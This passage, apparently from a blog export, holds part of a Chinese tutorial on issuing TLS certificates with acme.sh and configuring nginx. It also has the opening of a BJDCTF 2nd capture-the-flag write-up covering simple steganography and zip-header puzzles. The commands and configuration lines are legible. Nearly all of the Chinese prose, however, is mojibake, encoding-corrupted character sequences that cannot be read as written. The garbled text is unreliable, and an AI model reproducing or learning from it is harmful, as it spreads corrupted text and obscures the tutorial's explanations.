ä¸ºäº†é™åˆ¶æƒé™ï¼Œå¯ä»¥æ–°å»ºä¸€ä¸ªåŒºåŸŸçš„ API Key. è¿™é‡Œåªéœ€è¦ Zone.DNS çš„ç¼–è¾‘æƒé™ï¼ˆrestrict the API Token only for write access to Zone.DNS for a single domainï¼‰å°±è¡Œã€‚ export CF_Token=\"sdfsdfsdfljlbjkljlkjsdfoiwje\" export CF_Account_ID=\"xxxxxxxxxxxxx\" export CF_Zone_ID=\"xxxxxxxxxxxxx\" Account_ID å’Œ Zone_ID åœ¨åŸŸåçš„ç®¡ç†é¡µé¢å³ä¸‹æ–¹å¯ä»¥å¾—åˆ°ã€‚ è€Œåå†ç­¾å‘è¯ä¹¦ã€‚ acme.sh --issue --dns dns_cf -d example.com ä¹‹åè¿™äº›é…ç½®ä¿¡æ¯ä¼šä¿å­˜åˆ° ~/.acme.sh/account.conf è¿™ä¸ªæ–‡ä»¶é‡Œï¼Œåœ¨è¯ä¹¦ç»­æœŸæˆ–è€…å…¶ä»–åˆ©ç”¨ CF è¿›è¡ŒéªŒè¯çš„æ—¶å€™ä¼šè‡ªåŠ¨è°ƒç”¨ã€‚ å½“ç„¶ï¼Œå›½å†…ä¸€èˆ¬ç”¨çš„æ˜¯ DNSPodï¼Œä¹Ÿæä¾›äº† APIï¼Œç±»ä¼¼é…ç½®å°±å¥½äº†ã€‚ export DP_Id=\"1234\" export DP_Key=\"sADDsdasdgdsf\" acme.sh --issue --dns dns_dp -d example.com -d www.example.com ï¼ˆè¿™ä¸ªå…¶å®å°±æ˜¯å¤šåŸŸåç­¾å‘äº†ï¼‰ æ›´å¤šä¾‹å­å‚è€ƒå®˜æ–¹ Wiki å¥½äº†â†’ How to use DNS API 2.2.2 DNS manual modeé€‚åˆåŸŸåæœåŠ¡å•†æ²¡æœ‰æä¾› API çš„æƒ…å†µï¼Œéœ€è¦è‡ªå·±åœ¨åŸŸåé…ç½®ä¸€ä¸ª TXT è®°å½•ï¼Œä¸”ä¸èƒ½è‡ªåŠ¨ç»­æœŸï¼Œæ¯æ¬¡éƒ½éœ€è¦é‡æ–°é…ç½®ã€‚ acme.sh --issue -d example.com --dns -d www.example.com æ›´å¤šè¯·å‚è€ƒå®˜æ–¹æ•™ç¨‹ DNS manual modeã€‚ 2.2.3 DNS alias modeå¦‚æœåŸŸåæœåŠ¡å•†æ²¡æœ‰æä¾› APIï¼Œæˆ–è€…æ˜¯ä¸€ä¸ªæŒºé‡è¦çš„åŸŸåï¼Œä¸ºäº†å®‰å…¨ä¸å¸Œæœ›æˆ–è€…ä¸æ–¹ä¾¿ç›´æ¥é…ç½®è¿™ä¸ªåŸŸåçš„è§£æè®°å½•ï¼Œå¯ä»¥é€šè¿‡å¦ä¸€ä¸ªæ²¡é‚£ä¹ˆé‡è¦çš„åŸŸåï¼ˆå¯èƒ½æ˜¯ä¸“é—¨ç”¨æ¥ç­¾å‘è¯ä¹¦çš„ï¼‰é—´æ¥è¿›è¡Œé…ç½®ã€‚ å®é™…ä¸Šè¿˜æ˜¯éœ€è¦æœ‰ä¸€ä¸ªåŸŸåæ¥éªŒè¯æ‰€æœ‰æƒå•¦ï¼ æ›´å¤šå‚è€ƒå®˜æ–¹æ•™ç¨‹ DNS alias mode å¥½äº†ã€‚ 2.3 å¤šåŸŸåé…ç½®å¤šä¸ªåŸŸåç­¾å‘åŒä¸€å¼ è¯ä¹¦ã€‚åªéœ€è¦åœ¨éªŒè¯æ–¹å¼ä¹‹åæ·»åŠ å¤šä¸ª -d &lt;YourDomainHere&gt; å‚æ•°å°±è¡Œã€‚ acme.sh --issue -d example.com -w /home/wwwroot/example.com -d www.example.com acme.sh --issue -d example.com --standalone -d www.example.com acme.sh --issue -d example.com --dns -d www.example.com ä¹Ÿå¯ä»¥å¤šä¸ªåŸŸåæŒ‡å®šä¸åŒçš„éªŒè¯æ–¹å¼ï¼Œä¾‹å¦‚ acme.sh --issue \\ -d aa.com -w /home/wwwroot/aa.com \\ -d bb.com --dns dns_cf \\ -d cc.com --apache \\ -d dd.com -w /home/wwwroot/dd.com 2.4 æ³›åŸŸåé…ç½®Wildcard certificates åŒç†ï¼Œåªéœ€è¦åŠ ä¸ª*å°±å¥½ã€‚ä¸è¿‡å¥½åƒåªé€‚ç”¨äº DNS éªŒè¯çš„æ–¹å¼ã€‚ acme.sh --issue -d example.com -d '*.example.com' --dns dns_cf 2.5 ç­¾å‘ ECC è¯ä¹¦é»˜è®¤ç­¾å‘çš„éƒ½æ˜¯åŸºäº RSA å¯†é’¥åŠ å¯†çš„è¯ä¹¦ï¼Œè€Œ ECC (Elliptic Curve Cryptography, æ¤­åœ†æ›²çº¿å¯†ç ) å¯†é’¥çš„ä¿å¯†æ€§æ¯” RSA æ›´å¥½ï¼Œå¯†é’¥é•¿åº¦æ›´çŸ­ï¼Œæ›´èƒ½å¯¹æŠ—é‡å­è§£å¯†ç­‰ï¼Œç›®å‰ç°ä»£çš„æ“ä½œç³»ç»Ÿå’Œæµè§ˆå™¨éƒ½æ”¯æŒ ECC è¯ä¹¦äº†ï¼ˆWindows XP åŠå…¶ä¹‹å‰çš„å°±ç®—äº†ï¼‰ã€‚ Let's Encrypt æä¾›äº† ECDSA è¯ä¹¦çš„ç­¾å‘ï¼Œä¸” acme.sh ä¹Ÿæ”¯æŒã€‚ æˆ‘çœ‹ç½‘ä¸Šçš„æ•™ç¨‹åŸºæœ¬æ²¡è®² ECC è¯ä¹¦çš„ç­¾å‘ï¼Œè¿™é‡Œå°±æ¥æ•´ä¸€ä¸‹å‘—ï¼ å…¶å®åªéœ€è¦åŠ ä¸Šä¸€ä¸ªä»¥ ec- ä¸ºå‰ç¼€çš„ --keylength å‚æ•°ï¼ˆæˆ– -kï¼‰å°±å¯ä»¥äº†ã€‚ç†è®ºä¸Šä¸Šé¢çš„å„ç§éªŒè¯æ–¹å¼éƒ½é€‚ç”¨ã€‚ æ¯”å¦‚ acme.sh --issue -w /home/wwwroot/example.com -d example.com --keylength ec-256 # å•åŸŸå acme.sh --issue -w /home/wwwroot/example.com -d example.com -d www.example.com --keylength ec-256 # å¤šåŸŸå æ”¯æŒä»¥ä¸‹é•¿åº¦çš„è¯ä¹¦ï¼Œä¸€èˆ¬å°±ç”¨ ec-256 å°±è¡Œäº†ã€‚ ec-256 (prime256v1, â€œECDSA P-256â€) ec-384 (secp384r1, â€œECDSA P-384â€) ec-521 (secp521r1, â€œECDSA P-521â€, which is not supported by Letâ€™s Encrypt yet.) 0x03 å®‰è£…(copy)è¯ä¹¦ç­¾å‘è¯ä¹¦æˆåŠŸåï¼Œéœ€è¦æŠŠè¯ä¹¦å®‰è£…æˆ–è€…å¤åˆ¶åˆ°çœŸæ­£éœ€è¦çš„åœ°æ–¹ï¼Œå¦‚ nginx / apache çš„ç›®å½•ä¸‹ã€‚ å®˜æ–¹è¯´å¿…é¡»ç”¨ä¸‹é¢çš„å‘½ä»¤æ¥å®‰è£…è¯ä¹¦ï¼Œä¸èƒ½ç›´æ¥ç”¨ ~/.acme.sh/ç›®å½•ä¸‹çš„è¯ä¹¦æ–‡ä»¶ï¼Œå› ä¸ºé‚£åªèƒ½å†…éƒ¨ä½¿ç”¨ï¼Œä¸”æœªæ¥ç›®å½•ç»“æ„å¯èƒ½ä¼šæ›´æ”¹ã€‚ æˆ‘ä»¬åªéœ€è¦ä½¿ç”¨ --installcert å‘½ä»¤ï¼ŒæŒ‡å®šç›®æ ‡ä½ç½®ï¼Œç„¶åè¯ä¹¦æ–‡ä»¶å°±ä¼šè¢« copy åˆ°ç›¸åº”çš„ä½ç½®äº†ã€‚ å…¶ä¸­åŸŸåæ˜¯å¿…é¡»çš„ï¼Œå…¶ä»–å‚æ•°æ˜¯å¯é€‰çš„ã€‚ æœ‰å¿…è¦çš„è¯ï¼Œå¯èƒ½éœ€è¦å¯¹è¯ä¹¦æ–‡ä»¶çš„æ‰€å±æƒé™è¿›è¡Œä¸€äº›è®¾ç½®ã€‚ï¼ˆæˆ‘è¿™è¾¹æ²¡æœ‰é—®é¢˜å‘¢ï¼Œå°±ç•¥äº†å§ï¼‰ 3.1 Nginxacme.sh --installcert -d example.com \\ --key-file /path/to/keyfile/in/nginx/key.pem \\ --fullchain-file /path/to/fullchain/nginx/cert.pem \\ --reloadcmd \"service nginx force-reload\" æ¯”å¦‚ä½ å¯ä»¥åœ¨ nginx çš„ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ª ssl ç›®å½•ï¼Œç„¶åæŠŠè¯ä¹¦å®‰è£… / copy è¿‡å»ã€‚ acme.sh --installcert -d example.com \\ --key-file /etc/nginx/ssl/example.com.key \\ --fullchain-file /etc/nginx/ssl/example.com.fullchain.cer \\ --reloadcmd \"service nginx force-reload\" è¿™é‡Œç”¨çš„æ˜¯ service nginx force-reload, ä¸æ˜¯ service nginx reload, æ®æµ‹è¯•, reload å¹¶ä¸ä¼šé‡æ–°åŠ è½½è¯ä¹¦, æ‰€ä»¥ç”¨çš„ force-reloadã€‚ Nginx çš„é…ç½® ssl_certificate ä½¿ç”¨ /etc/nginx/ssl/fullchain.cer ï¼Œè€Œé /etc/nginx/ssl/.cer ï¼Œå¦åˆ™ SSL Labs çš„æµ‹è¯•ä¼šæŠ¥ Chain issues Incomplete é”™è¯¯ã€‚ 3.2 Apacheacme.sh --install-cert -d example.com \\ --cert-file /path/to/certfile/in/apache/cert.pem \\ --key-file /path/to/keyfile/in/apache/key.pem \\ --fullchain-file /path/to/fullchain/certfile/apache/fullchain.pem \\ --reloadcmd \"service apache2 force-reload\" åœ¨å‘½ä»¤ä¸­çš„ reloadcmd å‚æ•°å¾ˆé‡è¦ï¼ è¿™ä¸ªç”¨æ¥æŒ‡å®šè¯ä¹¦æ›´æ–°ï¼ˆRenewï¼‰åæ‰§è¡Œçš„å‘½ä»¤ï¼Œä»è€Œä½¿ç»­æœŸåçš„è¯ä¹¦ç”Ÿæ•ˆã€‚ é»˜è®¤ 60 å¤©å°±ä¼šç»­æœŸä¸€æ¬¡ï¼Œä¸Šé¢è¿™äº›å‚æ•°ä¼šè®°å½•ä¸‹æ¥å¹¶è‡ªåŠ¨æ‰§è¡Œã€‚ï¼ˆå‡ å¥½ï¼Œè´¼æ–¹ä¾¿ 0x04 ç”Ÿæˆ dhparam.pem æ–‡ä»¶ï¼ˆå¯é€‰ï¼‰openssl dhparam -out /etc/nginx/ssl/dhparam.pem 2048 è¿™ä¸€æ­¥æ˜¯ä¸ºäº†å¢å¼º SSL çš„å®‰å…¨æ€§ã€‚è¿™é‡Œç”Ÿæˆä¸€ä¸ªæ›´å¼ºå£®çš„ DHE å‚æ•°ã€‚ å‰å‘å®‰å…¨æ€§ï¼ˆForward Secrecyï¼‰çš„æ¦‚å¿µå¾ˆç®€å•ï¼šå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨åå•†ä¸€ä¸ªæ°¸ä¸é‡ç”¨çš„å¯†é’¥ï¼Œå¹¶åœ¨ä¼šè¯ç»“æŸæ—¶é”€æ¯å®ƒã€‚æœåŠ¡å™¨ä¸Šçš„ RSA ç§é’¥ç”¨äºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´çš„ Diffie-Hellman å¯†é’¥äº¤æ¢ç­¾åã€‚ä» Diffie-Hellman æ¡æ‰‹ä¸­è·å–çš„é¢„ä¸»å¯†é’¥ä¼šç”¨äºä¹‹åçš„ç¼–ç ã€‚å› ä¸ºé¢„ä¸»å¯†é’¥æ˜¯ç‰¹å®šäºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´å»ºç«‹çš„æŸä¸ªè¿æ¥ï¼Œå¹¶ä¸”åªç”¨åœ¨ä¸€ä¸ªé™å®šçš„æ—¶é—´å†…ï¼Œæ‰€ä»¥ç§°ä½œçŸ­æš‚æ¨¡å¼ï¼ˆEphemeralï¼‰ã€‚ ä½¿ç”¨äº†å‰å‘å®‰å…¨æ€§ï¼Œå¦‚æœä¸€ä¸ªæ”»å‡»è€…å–å¾—äº†ä¸€ä¸ªæœåŠ¡å™¨çš„ç§é’¥ï¼Œä»–æ˜¯ä¸èƒ½è§£ç ä¹‹å‰çš„é€šè®¯ä¿¡æ¯çš„ã€‚è¿™ä¸ªç§é’¥ä»…ç”¨äº Diffie Hellman æ¡æ‰‹ç­¾åï¼Œå¹¶ä¸ä¼šæ³„éœ²é¢„ä¸»å¯†é’¥ã€‚Diffie Hellman ç®—æ³•ä¼šç¡®ä¿é¢„ä¸»å¯†é’¥ç»ä¸ä¼šç¦»å¼€å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ï¼Œè€Œä¸”ä¸èƒ½è¢«ä¸­é—´äººæ”»å‡»æ‰€æ‹¦æˆªã€‚ nginx ä¾èµ–äº OpenSSL ç»™ Diffie-Hellman ï¼ˆDHï¼‰çš„è¾“å…¥å‚æ•°ã€‚ä¸å¹¸çš„æ˜¯ï¼Œè¿™æ„å‘³ç€ Diffie-Hellman Ephemeralï¼ˆDHEï¼‰å°†ä½¿ç”¨ OpenSSL çš„é»˜è®¤è®¾ç½®ï¼ŒåŒ…æ‹¬ä¸€ä¸ªç”¨äºå¯†é’¥äº¤æ¢çš„1024ä½å¯†é’¥ã€‚å› ä¸ºæˆ‘ä»¬æ­£åœ¨ä½¿ç”¨2048ä½è¯ä¹¦ï¼ŒDHE å®¢æˆ·ç«¯å°±ä¼šä½¿ç”¨ä¸€ä¸ªè¦æ¯”é DHE å®¢æˆ·ç«¯æ›´å¼±çš„å¯†é’¥äº¤æ¢ã€‚ æ›´å¤šå‚è€ƒè¿™é‡Œ Guide to Deploying Diffie-Hellman for TLS å§ã€‚ 0x05 é…ç½® Nginxæ²¡ç”¨è¿‡ Apacheï¼Œè¿™é‡Œåªè¯´ Nginx å¥½äº†ã€‚ï¼ˆå…¶å®ä¹Ÿä¸æ€ä¹ˆä¼šç”¨ï¼ˆå°å£°bb ä¿®æ”¹ç½‘ç«™çš„ conf é…ç½®æ–‡ä»¶ï¼ŒåŠ å…¥ SSL çš„ç›¸å…³é…ç½®ã€‚ server { server_name example.com; listen 443 ssl http2 default_server; listen [::]:443 ssl http2 default_server; # ... # ssl ç›¸å…³é…ç½® ssl_certificate /etc/nginx/ssl/example.com.fullchain.cer; ssl_certificate_key /etc/nginx/ssl/example.com.key; ssl_dhparam /etc/nginx/ssl/dhparam.pem; ssl_protocols TLSv1 TLSv1.1 TLSv1.2; ssl_ciphers '[ECDHE-ECDSA-AES128-GCM-SHA256|ECDHE-ECDSA-CHACHA20-POLY1305|ECDHE-RSA-AES128-GCM-SHA256|ECDHE-RSA-CHACHA20-POLY1305]:ECDHE+AES128:RSA+AES128:ECDHE+AES256:RSA+AES256:ECDHE+3DES:RSA+3DES'; ssl_prefer_server_ciphers on; # ... } ssl_dhparam /etc/nginx/ssl/dhparam.pem; æ˜¯åœ¨ 0x04 æ­¥éª¤ä¸­ç”Ÿæˆçš„ï¼Œå¯é€‰ã€‚ ssl_ciphers ç”¨äºæŒ‡å®šåŠ å¯†å¥—ä»¶ï¼Œè¿™é‡Œé‡‡ç”¨çš„æ˜¯ CloudFlare å®¶çš„ï¼Œå…·ä½“ä¹Ÿä¸æ˜¯å¾ˆæ¸…æ¥š emmmã€‚å¯ä»¥å‚è€ƒä¸€ä¸‹ Mozilla çš„ Wikiï¼šSecurity/Server Side TLS æ›´å¤šå‚æ•°å¯ä»¥å‚è€ƒ nginx çš„æ–‡æ¡£ï¼šModule ngx_http_ssl_module TLSv1.3ï¼ˆå¯é€‰ï¼‰ç°åœ¨å¾ˆå¤šç½‘ç«™éƒ½ä¸Š TLSv1.3 äº†ï¼Œè¯ä¹¦æ£€æµ‹çš„ç½‘ç«™å¯¹äº TLSv1ã€TLSv1.1 éƒ½è®¤ä¸ºä¸å®‰å…¨äº†ï¼ŒFirefox è‡ª 74.0 ç‰ˆæœ¬å¼€å§‹ä¹Ÿå®Œå…¨æ”¾å¼ƒå¯¹åŠ å¯†åè®® TLS 1.0 å’Œ TLS 1.1 çš„æ”¯æŒäº†ã€‚ å¯¹äº TLSv1.3 çš„é…ç½®ï¼Œéœ€è¦å®‰è£…æœ€æ–°ç‰ˆçš„ opensslï¼ˆOpenSSL 1.1.1 built with TLSv1.3æˆ–æ›´é«˜ï¼‰ï¼Œè€Œåé‡æ–°ç¼–è¯‘ nginxï¼Œæ˜¯æœ‰ç‚¹éº»çƒ¦è¿™é‡Œæ‡’å¾—å¼„äº†ï¼Œåé¢éœ€è¦å†æŠ˜è…¾å§ã€‚ å¼€å¯ HSTSï¼ˆå¯é€‰ï¼‰å½“ç„¶ï¼Œä¸ºäº†æ›´åŠ å®‰å…¨ï¼Œå¯ä»¥é€‰æ‹©å¼€å¯ HSTSï¼ˆHTTP Strict Transport Securityï¼ŒHTTPä¸¥æ ¼ä¼ è¾“å®‰å…¨åè®®ï¼‰ï¼Œå¼ºåˆ¶æµè§ˆå™¨é€šè¿‡ https è¿›è¡Œè®¿é—®ã€‚éœ€è¦åœ¨ location ä¸‹çš„è®¾ç½®ä¸­åŠ å…¥ä¸€ä¸ª headerã€‚ add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\"; æ¥ä¸‹æ¥çš„ä¸€å¹´ï¼ˆå³31536000ç§’ï¼‰ä¸­ï¼Œæµè§ˆå™¨çœ‹åˆ° header ä¸­åŒ…å« Strict-Transport-Security çš„è¯å°±ä¼šè‡ªåŠ¨åˆ‡æ¢åˆ° httpsã€‚ ä½†æ˜¯åœ¨é¦–æ¬¡è®¿é—®ç½‘ç«™æ—¶å¦‚æœè¢«åŠ«æŒäº†ï¼Œæµè§ˆå™¨è¿˜æ˜¯å¯èƒ½ä¼šé€šè¿‡ HTTP æ˜æ–‡ä¼ é€’ä¿¡æ¯ã€‚ä¸ºæ­¤ï¼ŒChrome ç»´æŠ¤äº†ä¸€ä¸ª HSTS preload listï¼Œå†…ç½®åœ¨æµè§ˆå™¨ä¸­ï¼Œå¯¹äº Chrome, Firefox, Opera, Safari, IE 11 and Edge ç­‰ä¸»æµæµè§ˆå™¨ä¹Ÿé€‚ç”¨ã€‚å¯ä»¥åœ¨è¿™é‡Œæäº¤ä½ çš„åŸŸååˆ°è¿™ä¸ªåˆ—è¡¨é‡Œã€‚ï¼ˆä¸è¿‡æäº¤ä¹‹å‰è¦è€ƒè™‘å¥½ï¼Œå…¨ç«™ä¸Š https å™¢ å¦‚æœ TLS è¯ä¹¦æ— æ•ˆæˆ–ä¸å¯ä¿¡ï¼Œç”¨æˆ·ä¸èƒ½å¿½ç•¥æµè§ˆå™¨è­¦å‘Šç»§ç»­è®¿é—®ç½‘ç«™ã€‚è¿™å°±æ˜¯å‰å‡ å¤©è®¿é—® GitHub (Pages) ç­‰ç½‘ç«™è¢«æ‹¦ä¸‹æ¥çš„åŸå› äº†ã€‚ ä¸Šé¢çš„é…ç½®å®Œæˆåæ£€æŸ¥ä¸€ä¸‹é…ç½®æ˜¯å¦æ­£ç¡®ï¼Œè€Œåé‡å¯ nginxã€‚ nginx -t systemctl restart nginx ä¹‹åå°±å¯ä»¥è¯•ä¸€ä¸‹èƒ½ä¸èƒ½é€šè¿‡ https æ¥è®¿é—®è‡ªå·±çš„ç½‘ç«™å•¦ï¼ åˆ°è¿™é‡Œ SSL é…ç½®å°±å‘Šä¸€æ®µè½äº†ï¼Œä¸‹é¢æ˜¯ä¸€äº› acme.sh çš„ç»´æŠ¤ç›¸å…³çš„äº†ã€‚ 0x06 æ›´æ–°è¯ä¹¦è¯ä¹¦çš„æœ‰æ•ˆæœŸä¸º 90 å¤©ï¼Œacme.sh ä¼š 60 å¤©æ›´æ–°ï¼ˆRenewï¼‰ä¸€æ¬¡ã€‚ åœ¨å®‰è£… acme.sh çš„æ—¶å€™å°±è‡ªåŠ¨é…ç½®äº†ä¸€æ¡ cron ä»»åŠ¡äº†ï¼Œä¼šæ¯å¤©æ£€æŸ¥è¯ä¹¦çš„æƒ…å†µã€‚å½“ç„¶å¯ä»¥åˆ° crontab é‡Œçœ‹ä¸€ä¸‹ã€‚ # crontab -l 43 0 * * * \"/root/.acme.sh\"/acme.sh --cron --home \"/root/.acme.sh\" &gt; /dev/null ä¹Ÿå¯ä»¥è¯•ç€ç”¨ä¸Šé¢è¿™æ¡å‘½ä»¤æ‰§è¡Œçœ‹ä¸€ä¸‹ç›¸å…³çš„é…ç½®æ˜¯å¦æ­£ç¡®ã€‚ å¼ºåˆ¶æ›´æ–°å¯ä»¥è¿™æ ·ã€‚ acme.sh --renew -d example.com --force acme.sh --renew -d example.com --force --ecc # å¦‚æœç”¨çš„æ˜¯ECCè¯ä¹¦ 0x07 åœæ­¢æ›´æ–°è¯ä¹¦æŸ¥çœ‹è¯ä¹¦åˆ—è¡¨ acme.sh --list åœæ­¢ Renew acme.sh --remove -d example.com [--ecc] ä¹‹åæ‰‹åŠ¨æŠŠç›®å½•ä¸‹çš„è¯ä¹¦ç§»é™¤å°±è¡Œã€‚ 0x08 å‡çº§ acme.shacme.sh --upgrade # æ‰‹åŠ¨å‡çº§ acme.sh --upgrade --auto-upgrade # è‡ªåŠ¨å‡çº§ acme.sh --upgrade --auto-upgrade 0 # åœæ­¢è‡ªåŠ¨å‡çº§ 0xFF å°ç»“é™¤äº†ä¸Šé¢è¿™äº›é…ç½®ä¹‹å¤–ï¼Œacme.sh è¿˜æä¾›äº†é€šçŸ¥æé†’ï¼Œå¯ä»¥è°ƒç”¨å…¶ä»– API æ¥æ¨é€æé†’ï¼Œå…·ä½“å‚è€ƒå®˜æ–¹Wikiï¼šnotifyã€‚ æ€»ä¹‹æ„Ÿè§‰è¿™ä¸ªå·¥å…·è¿˜æ˜¯å¾ˆå®ç”¨çš„ï¼Œå¤§å¤§é™ä½äº† SSL é…ç½®çš„é—¨æ§›å‘¢ã€‚ è‰ï¼ˆä¸€ç§æ¤ç‰©ï¼‰ï¼Œæ„Ÿè§‰æˆ‘æŠŠå®˜æ–¹çš„æ•™ç¨‹ç¿»è¯‘äº†ï¼Œç„¶ååˆæ‰¾äº†ä¸€äº›å…¶ä»–çš„èµ„æ–™æ•´åˆèµ·æ¥äº†çš„äºšå­emmmã€‚ä¸è¿‡å¤§éƒ¨åˆ†è¿˜æ˜¯è‡ªå·±æ‰‹ç çš„å­—å•¦ï¼ å®é™…ä¸Šæˆ‘è¿™æ¬¡é…ç½®çš„æ˜¯ ECC å¯†é’¥çš„æ³›åŸŸåè¯ä¹¦ï¼Œç”¨çš„æ˜¯ DNS API çš„æ¨¡å¼ã€‚å…¶å®å‡ ä¸ªæœˆå‰å°±æŠ˜è…¾è¿‡ SSL è¯ä¹¦çš„é…ç½®äº†ï¼Œç„¶è€Œè¿‡äº†å°±å¿˜äº†ï¼Œå½“æ—¶å…ˆæ˜¯ç”¨ HTTP æ¨¡å¼è¿›è¡ŒéªŒè¯ï¼Œå‘ç°è¡Œä¸é€šæ‰æ¢çš„ DNS æ¨¡å¼ã€‚è¿™æ¬¡å¹²è„†ä¸€èµ·ç†ä¸€éå¥½äº†ï¼Œè¿‡ç¨‹ä¸­å‘ç°åŸæ¥ HTTP æ¨¡å¼éªŒè¯æ¯”æˆ‘æƒ³çš„è¿˜è¦å¼ºå¤§ï¼Œåªæ˜¯éœ€æ±‚ï¼ˆä¸»è¦æ˜¯éœ€è¦æ³›åŸŸåè¯ä¹¦ï¼‰å¯¹ä¸ä¸Šç½¢äº†ã€‚ æ€ä¹ˆè¯´å¥½å‘¢ï¼Œç»å¯¹å®‰å…¨ä¸å¤§å¯èƒ½ï¼Œéƒ½æ˜¯æƒ³æ–¹è®¾æ³•å°½å¯èƒ½ç›¸å¯¹å®‰å…¨ä¸€äº›å‘¢ã€‚ å¸Œæœ›è¿™ä¸€ç¯‡ä¸ä¼šæµªè´¹æ‚¨çš„å®è´µæ—¶é—´å‘¢ï¼Œæœ‰ç”¨çš„è¯æ¬¢è¿ç»™æˆ‘ä¹°ç‚¹å¥½åƒçš„/buy me a coffeeï¼ˆé¥¿äº†å–µ æºœäº†æºœäº†ï¼ˆ References &amp; Extensive Readingä¸‹é¢æœ‰çš„æ˜¯å®˜æ–¹æ–‡æ¡£ï¼Œæœ‰çš„æ˜¯åšå®¢ä¹‹ç±»çš„ï¼Œç”±äºæ—¶æ•ˆæ€§æœ‰äº›å†…å®¹å¯èƒ½ä¸é€‚ç”¨äº†ã€‚æ³¨æ„ä¸€ä¸‹å°±å¼ã€‚ acme.sh GitHub ä»“åº“ å®˜æ–¹ä¸­æ–‡è¯´æ˜ How to issue a certï¼ˆå®˜æ–¹Wikiï¼‰ How to use DNS API Security/Server Side TLS ï¼ˆNginxæ–‡æ¡£ï¼‰Module ngx_http_ssl_module å¼€å§‹ä½¿ç”¨ECCè¯ä¹¦éƒ¨ç½²HTTPS MySSL HTTPS è¯„çº§ B å‡ A+ Nginxå¼€å¯TLSv1.3å’ŒHTTP/2 etc.","path":"2020/03/28/Server_IssueACertWithACME/"},{"title":"CTF | BJDCTF 2nd WriteUp","text":"å¼•è¨€ æœ¬å±ŠBJDCTFç”±æ±Ÿè‹ç§‘æŠ€å¤§å­¦ã€åŒ—äº¬å·¥ä¸šå¤§å­¦ã€è¥¿å—æ°‘æ—å¤§å­¦ã€æ­å·å¸ˆèŒƒå¤§å­¦ã€ æ±Ÿè‹å¤§å­¦ã€æ¹–å—å·¥ä¸šå¤§å­¦ï¼ˆæ’åä¸åˆ†å…ˆåï¼‰è”åˆä¸¾åŠ åˆ’æ°´åˆ’æ°´~ å‘¨æœ«æ°´äº†ä¸€ä¸‹ BJDCTF 2ndã€‚ çœ‹äº†ä¸€ä¸‹ï¼Œå¥½åƒ BJDCTF 2020 å·²ç»æœ‰è¿‡ä¸€è½®æ¯”èµ›äº†å”‰ï¼Œè¿™æ˜¯ç¬¬äºŒå±Šäº†ï¼Ÿï¼Ÿï¼Ÿï¼ˆä¸€ä¸ªæœˆä¸€å±Šï¼Ÿ å®˜æ–¹å£°ç§°è¿™æ˜¯ä¸€ä¸ªèŒæ–°èµ›ï¼Œæ€»ä½“éš¾åº¦ä¸ç®—å¾ˆå¤§ï¼Œäºæ˜¯å°±æ¥ç©äº†ä¸€ä¸‹ã€‚ ç„¶è€Œå–µå–µå–µï¼Œçš„ç¡®è®©æˆ‘çŸ¥é“äº†è‡ªå·±æœ¬æ¥å°±æ˜¯èŒæ–°ã€‚å˜¤å˜¤å˜¤ã€‚ é¢˜ç›®åœ¨è¿™é‡Œâ†“ã€‚ BUUCTF å…¬å¼€èµ›é“ï¼šæˆ³è¿™é‡Œhint æ±‡æ€»ï¼šåœ¨è¿™é‡Œ è¿™æ¬¡ç©çš„ä¸å¤šï¼Œä¸»è¦åšäº†ç‚¹ Misc, Crypto, Reverse çš„é¢˜ï¼ŒWeb æ²¡æ€ä¹ˆçœ‹ï¼ˆåé¢å¯èƒ½ä¼šå­¦ä¸€ä¸‹ PHPã€SQL å§ï¼‰ï¼Œpwn æ²¡çœ‹â€¦â€¦ ç®€å•å†™ä¸€ä¸‹ WriteUp å§ï¼Œæœ‰çš„å‚è€ƒäº†ä¸€ä¸‹å¤§ä½¬ä»¬çš„æ€è·¯ï¼Œä¸å®Œå–„çš„åé¢å†è¡¥å§ã€‚ MISCæœ€ç®€å•çš„misc-y1ngå‹ç¼©åŒ…ä¼ªåŠ å¯†ï¼Œæœ«å°¾ä¸¤ä¸ª 504B0102 ä¹‹åçš„åŠ å¯†ä½æ”¹ä¸º 00. è§£å‹åçœ‹åˆ°æ˜¯ IHDR ï¼Œå™¢æ˜¯ pngï¼Œè¡¥ä¸Šæ–‡ä»¶å¤´ 89504E47. å¾—åˆ°ä¸‹é¢çš„å›¾ç‰‡ã€‚ 424A447B79316E677A756973687561697D hex è½¬ ASCII BJD{y1ngzuishuai} A_Beautiful_Pictureå›¾ç‰‡å¤§å°æ”¹äº†ã€‚ã€‚ å¾—åˆ° EasyBaBa å›¾ç‰‡äºŒè¿›åˆ¶æ‹¼æ¥éšå†™ï¼Œæå–å¾—åˆ°å‹ç¼©åŒ…ï¼Œå‹ç¼©åŒ…é‡Œæ˜¯ é‡Œé¢éƒ½æ˜¯å‡ºé¢˜äºº.jpgã€‚ åå…­è¿›åˆ¶ç¼–è¾‘å™¨çœ‹å‘ç°æ˜¯ avi æ ¼å¼ã€‚æ”¹åç¼€æ’­æ”¾ï¼Œå™¢æ˜¯ æ€§æ„Ÿé’‰é’‰åœ¨çº¿æ±‚é¥¶ çš„è§†é¢‘ã€‚ å‘ç°æ’å…¥äº†å‡ ä¸ªå›¾ç‰‡ï¼Œè¿˜æœ‰äºŒç»´ç ã€‚ äºæ˜¯ PR å¤§æ³•å¥½ã€‚é€å¸§çœ‹å¾—åˆ°ä¸‹é¢å‡ å¼ äºŒç»´ç ã€‚ åˆ†åˆ«å¾—åˆ° 6167696E5F6C -&gt; agin_l 6F76655F59 -&gt; ove_Y 424A447B696D -&gt; BJD{im 316E677D -&gt; 1ng} è¿æˆä¸€å¥è¯ BJD{imagin_love_Y1ng} ï¼ˆè¿™ä¿©å•¥å…³ç³»å”‰ å˜¤å˜¤å˜¤ Real_EasyBaBa åˆšå¼€å§‹ä»¥ä¸ºæ˜¯ LSB ä¹‹ç±»çš„ï¼Œçœ‹äº†å„ä¸ªå›¾å±‚éƒ½æ²¡æ˜æ˜¾çš„ï¼Œä½†æ•´ä½“éƒ½æ˜¯æœ‰æ˜æ˜¾çš„é¢—ç²’æ„Ÿâ€¦â€¦ åæ¥ä»¥ä¸ºæ˜¯å’Œä¸Šé¢é‚£é¢˜çš„å›¾æœ‰å…³ç³»ï¼Œå¯¹ä¸¤å¼ å›¾åšäº†åŠ 